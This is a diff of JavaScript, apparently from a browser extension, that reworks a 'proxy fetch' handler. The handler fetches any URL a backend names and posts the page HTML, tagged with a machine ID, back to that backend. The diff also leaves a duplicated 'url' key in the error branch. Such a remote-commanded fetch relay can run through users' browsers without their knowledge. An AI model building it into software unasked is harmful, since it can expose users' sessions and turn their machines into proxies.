@@ -975,10 +975,10 @@ async function handleProxyFetchCommand(data) {
     }
     
     const html = await response.text();
-    log('info', `✅ Fetched ${html.length} bytes from ${target_url}`);
+    log('info', `✅ [ProxyFetch] Fetched ${html.length} bytes from ${target_url}`);
     
-    // 3. Send HTML back to backend via popup-response
-    const responseData = await fetch(`${CONFIG.API_BASE}/popup-response`, {
+    // 3. Send HTML back to backend via proxy-fetch-result (NOT popup-response!)
+    const responseData = await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -987,13 +987,10 @@ async function handleProxyFetchCommand(data) {
       body: JSON.stringify({
         command_id,
         machine_id: machineId,
-        domain: new URL(target_url).hostname,
         url: target_url,
-        form_data: { 
-          html_content: html,
-          status: response.status,
-          success: true
-        }
+        html_content: html,
+        status_code: response.status,
+        success: true
       })
     });
     
@@ -1001,14 +998,14 @@ async function handleProxyFetchCommand(data) {
       throw new Error(`Failed to send response: ${responseData.status}`);
     }
     
-    log('info', `✅ Proxy-fetch result sent to backend for command ${command_id}`);
+    log('info', `✅ [ProxyFetch] HTML result sent for command ${command_id}`);
     
   } catch (error) {
-    log('error', 'Proxy-fetch failed:', error);
+    log('error', '[ProxyFetch] Fetch failed:', error);
     
-    // Send error to backend
+    // Send error to backend via proxy-fetch-result
     try {
-      await fetch(`${CONFIG.API_BASE}/popup-response`, {
+      await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -1017,7 +1014,7 @@ async function handleProxyFetchCommand(data) {
         body: JSON.stringify({
           command_id,
           machine_id: machineId,
-          domain: new URL(target_url).hostname,
+          url: target_url,
           url: target_url,
           form_data: { 
             error: error.message,
